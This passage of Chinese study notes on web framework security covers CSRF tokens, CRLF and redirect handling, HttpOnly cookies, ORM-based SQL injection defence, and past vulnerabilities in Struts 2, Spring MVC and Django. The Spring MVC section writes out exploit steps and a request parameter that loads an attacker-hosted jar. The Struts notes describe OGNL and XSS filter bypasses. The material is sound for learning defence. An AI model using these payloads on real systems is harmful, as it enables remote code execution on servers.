		在其他的模板引擎中，也可以依据是否有细分场景使用不同的编码方式来判断XSS的安全方案是否完整
		在很多Web框架官方文档中推荐的用法，就是存在缺陷的
		Web框架的开发者在设计安全方案时，有时会缺乏来自安全专家的建议
		所以开发者在使用框架时，应该慎重对待安全问题，不可盲从官方指导文档

	Web框架与CSRF防御
		关于CSRF的攻击原理和防御方案 *跨站点请求伪造*
		在Web框架中可以使用security token解决CSRF攻击的问题
		CSRF攻击的目标，一般都会产生写数据操作的URL，比如增、删、改，而读数据操作并不是CSRF攻击的目标，因为在CSRF的攻击过程中攻击者无法获取到服务器端返回的数据，攻击者只是借用户之手触发服务器动作，所以读数据对于CSRF来说并无直接的意义(但是如果同时存在XSS漏洞或者其他的跨域漏洞，则可能会引起别的问题，在这里仅仅就CSRF对抗本身进行讨论)
		因此，在Web应用开发中，有必要对读操作和写操作予以区分，比如要求所有的写操作都使用HTTP POST
		在很多讲述CSRF防御的文章中，都要求使用HTTP POST进行防御，但实际上POST本身并不足以对抗CSRF，因为POST也是可以自动提交的
		但是POST的使用，对于保护token有着积极的意义，而security token的私密性(不可预测性原则)，是防御CSRF攻击的基础
		对于Web框架来说，可以自动地在所有涉及POST的代码中添加token，这些地方包括所有的form表单、所有的Ajax POST请求等
		完整的CSRF防御方案，对于Web框架来说有以下几处地方需要改动
			* 在Session中绑定token
				如果不能保存到服务器端Session中，则可以替代为保存到Cookie里
			* 在form表单中自动填入token字段
				---------------------------------------------------------
				<input type=hidden name="anti_csrf_token"value="$token"/>
				---------------------------------------------------------
			* 在Ajax请求中自动添加token，这可能需要已有的Ajax封装实现的支持
			* 在服务器端对比POST提交参数的token与Session中绑定的token是否一致，以验证CSRF攻击
		在Django中也有类似的功能，但是配置稍微要复杂点
			* 将django.middleware.csrf.CsrfViewMiddleware添加到MIDDUEWARE_CLASSES中
			* 在form表单的模板中添加token
			* 确认在View层的函数中使用了django.core.context_processors.csrf，如果使用的是RequestContext，则默认已经使用了，否则需要手动添加
		在Ajax请求中，一般是插入一个包含了token的HTTP头，使用HTTP头是为了防止token泄密，因为一般的JavaScript无法获取到HTTP头的信息，但是在存在一些跨域漏洞时可能会出现例外
		在Spring MVC以及一些其他的流行Web框架中，并没有直接提供针对CSRF的保护，因此这些功能需要自己实现

	HTTP Headers管理
		在Web框架中，可以对HTTP头进行全局化的处理，因此一些基于HTTP头的安全方案可以很好地实施
		比如针对HTTP返回头的CRLF注入 *注入攻击* ，因为HTTP头实际上可以 看成是key-value对
		因此对抗CRLF的方案只需要在value中编码所有的\r\n即可，这里没有提到在key中编码\r\n，是因为让用户能够控制key是极其危险的事情，在任何情况下都不应该使其发生
		类似的，针对30X返回号的HTTP Response，浏览器将会跳转到Location指定的URL，攻击者往往利用此类功能实施钓鱼或诈骗
		因此，对于框架来说，管理好跳转目的地址是很有必要的
		一般来说，可以在两个地方做这件事情
			* 如果Web框架提供统一的跳转函数，则可以在跳转函数内部实现一个白名单，指定跳转地址只能在白名单中
			* 另一种解决方式是控制HTTP的Location字段，限制Location的值只能是哪些地址，也能起到同样的效果，其本质还是白名单
		有很多与安全相关的Headers,也可以统一在Web框架中配置
		Web框架可以封装此功能，并提供页面配置
		该HTTP头有三个可选的值，适用于各种不同的场景
			* SAMEORIGIN
			* DENY
			* ALLOW-FROM origin
		前面曾提到Cookie的HttpOnly Flag，它能告诉浏览器不要让JavaScript访问该Cookie，在Session劫持等问题上有着积极的意义，而且成本非常小
		但并不是所有的Web服务器、Web容器、脚本语言提供的API都支持设置HttpOnly Cookie，所以很多时候需要由框架实现一个功能，对所有的Cookie默认添加HttpOnly，不需要此功能的Cookie则单独在配置文件中列出
		这将是非常有用的一项安全措施，在框架中实现的好处就是不用担心会有遗漏，就HttpOnly Cookie来说，它要求在所有服务器端设置该Cookie的地方都必须加上，这可能意味着很多不同的业务和页面，只要一个地方有遗漏，就会成为短板
		当网站的业务复杂时，登录入又可能就有数十个，兼顾所有Set-Cookie页面会非常麻烦，因此在框架中解决将成为最好的方案
		一般来说，框架会提供一个统一的设置Cookie函数，HttpOnly的功能可以在此函数中实现，如果没有这样的函数，则需要统一在HTTP返回头中配置实现

	数据持久层与SQL注入
		使用ORM(Object/Relation Mapping)框架对SQL注入是有积极意义的
		我们知道对抗SQL注入的最佳方式就是使用预编译绑定变量
		在实际解决SQL注入时，还有一个难点就是应用复杂后，代码数量庞大，难以把可能存在SQL注入的地方不遗漏地找出来，而ORM框架为我们发现问题提供了一个便捷的途径
		以ORM框架ibatis举例，它是基于sqlmap的，生成的SQL语句都结构化地写在XML文件中
		ibatis支持动态SQL，可以在SQL语句中插入动态变量，$value$，如果用户能够控制这个变量，则会存在一个SQL注入的漏洞
		而静态变量#value#则是安全的，因此在使用ibatis时，只需要搜索所有的sqlmap文件中是否包含动态变量即可
		当业务需要使用动态SQL时，可以作为特例处理，比如在上层的代码逻辑中针对该变量进行严格的控制，以保证不会发生注入问题
		而在Django中，做法则更简单，Django提供的Database API，默认已经将所有输入进行了SQL转义
		使用Web框架提供的功能，在代码风格上更加统一，也更利于代码审计

	其他方案
		其实选择是很多的，凡是在Web框架中可能实现的安全方案，只要对性能没有太大的损耗，都应该考虑实施
		比如文件上传功能，如果应用实现有问题，可能就会成为严重的漏洞
		若是由每个业务单独实现文件上传功能，其设计和代码都会存在差异，复杂情况也会导致安全问题难以控制
		但如果在Web框架中能为文件上传功能提供一个足够安全的二方库或者函数 *文件上传漏洞* ，就可以为业务线的开发者解决很多问题，让程序员可以把精力和重点放在功能实现上
		Spring Security为Spring MVC的用户提供了许多安全功能，比如基于URL的访问控制、加密方法、证书支持、OpenID支持等
		但Spring Security尚缺乏诸如XSS、CSRF等问题的解决方案
		在设计整体安全方案时，比较科学的方法是按照第一章中所列举的过程来进行——首先建立威胁模型，然后再判断哪些威胁是可以在框架中得到解决的
		在设计Web框架安全解决方案时，还需要保存好安全检查的日志
		在设计安全逻辑时也需要考虑到日志的记录，比如发生XSS攻击时，可以记录下攻击者的IP、时间、UserAgent、目标URL、用户名等信息
		这些日志，对于后期建立攻击事件分析、入侵分析都是有积极意义的
		当然，开启日志也会造成一定的性能损失，因此在设计时，需要考虑日志记录行为的频繁程度，并尽可能避免误报
		在设计Web框架安全时，还需要与时俱进
		当新的威胁出现时，应当及时完成对应的防御方案，如此一个Web框架才具有生命力
		而一些0day漏洞，也有可能通过虚拟补丁的方式在框架层面解决，因为Web框架就像是一层外衣，为Web应用提供了足够的保护和控制力

	Web框架自身安全
		前面几节讲的都是在Web框架中实现安全方案，但Web框架本身也可能会出现漏洞，只要是程序，就可能出现bug
		但是开发框架由于其本身的特殊性，一般网站出于稳定的考虑不会对这个基础设施频繁升级，因此开发框架的漏洞可能不会得到及时的修补，但由此引发的后果却会很严重
		研究下面这些案例，可以帮助我们更好地理解框架安全，在使用开发框架时更加的小心，同时让我们不要迷信于开发框架的权威

		Struts 2命令执行漏洞
			安全研究者公布了Struts 2一个远程执行代码的漏洞(CVE-2010-1870)
			严格来说，这其实是XWork的漏洞，因为Struts 2的核心使用的是Web Work，而WebWork又是使用XWork来处理action的
			这个漏洞的细节描述公布在exploit-db上
				http://www.exploit-db.com/exploit/14360/
			XWork通过getters/setters方法从HTTP的参数中获取对应action的名称，这个过程是基于OGNL(Object Graph Navigation Language)的
			ParametersInterceptor是不允许参数名称中有#的，因为OGNL中的许多预定义变量也是以#表示的
			可是攻击者在过去找到了这样的方法(bug编号XW-641)
				使用\u0023来代替#,这是#的十六进制编码，从而构造出可以远程执行的攻击payload
			导致代码执行成功

		Struts 2的问题补丁
			Struts 2官方目前公布了几个安全补丁
				http://struts.apache.org/2.x/docs/security-bulletins.html
			但深入其细节不难发现，补丁提交者对于安全的理解是非常粗浅的
			以S2-002的漏洞修补为例，这是一个XSS漏洞，发现者当时提交给官方的POC只是构造了script标签
			官方新增修补代码
			----------------------------------------------------
			String result = link.toString():

			if (result.indexOf("<script>") >= 0)
			{
				result = result.replaceAll("<script>","script");
			}
			----------------------------------------------------
			于是有人发现，如果构造<<script>>，经过一次处理后会变为<script>
			漏洞报告给官方后，开发者再次提交了一个补丁，这次将递归处理类似<<<<script>>>>的情况
			修补代码仅仅是将if变成while
			这种漏洞修补方式，仍然是存在问题的，攻击者可以通过下面的方法绕过
			由此可见，Struts 2的开发者，本身对于安全的理解是非常不到位的

		Spring MVC命令执行漏洞
			公布了Spring框架一个远程执行命令漏洞，CVE编号是CVE-2010-1622
			漏洞影响范围如下
				* SpringSource Spring Framework 3.0.0~3.0.2
				* SpringSource Spring Framework: 2.5.0~2.5.7
			由于Spring框架允许使用客户端所提供的数据来更新对象属性，而这一机制允许攻击者修改class.classloader加载对象的类加载器的属性，这可能导致执行任意命令
			例如，攻击者可以将类加载器所使用的URL修改到受控的位置
				* 创建attack.jar并可通过HTTP URL使用，这个jar必须包含以下内容
					* META-INF/spring-form.tld，定义Spring表单标签并指定实现为标签文件而不是类
					* META-INF/tags/中的标签文件，包含标签定义(任意Java代码)
				* 通过以下HTTP参数向表单控制器提交HTTP请求
					------------------------------------------------------------
					class.classLoader.URLs[0] = jar:http://attacker/attack.jar!/
					------------------------------------------------------------
					这会使用攻击者的URL覆盖WebappClassLoader的repositoryURLs属性的第0个元素
				* 之后org.apache.jasper.compiler.TldLocationsCache.scanJars()会使用WebappClassLoader的URL解析标签库，会对TLD中所指定的所有标签文件解析攻击者所控制的jar
			这个漏洞将直接危害到使用Spring MVC框架的网站，而大多数程序员可能并不会注意到这个问题

		Django命令执行漏洞
			在Django 0.95版本中，也出现了一个远程执行命令漏洞，根据官方代码diff后的细节，可以看到这是一个很明显的命令注入漏洞， *注入攻击* ，曾经描述过这种漏洞
			Django在处理消息文件时存在问题，远程攻击者构建恶意.po文件，诱使用户访问处理，可导致以应用程序进程权限执行任意命令
				http://code.djangoproject.com/changeset/3592
			这是一个典型的命令注入漏洞，但这个漏洞从利用上来说，意义不是特别大，它的教育意义更为重要

	总结
		Web框架本身也是应用程序的一个组成部分，只是这个组成部分较为特殊，处于基础和底层的位置
		Web框架为安全方案的设计提供了很多便利，好好利用它的强大功能，能够设计出非常优美的安全方案
		但我们也不能迷信于Web框架本身
		很多Web框架提供的安全解决方案有时并不可靠，我们仍然需要自己实现一个更好的方案，同时Web框架自身的安全性也不可忽视，作为一个基础服务，一旦出现漏洞，影响是巨大的
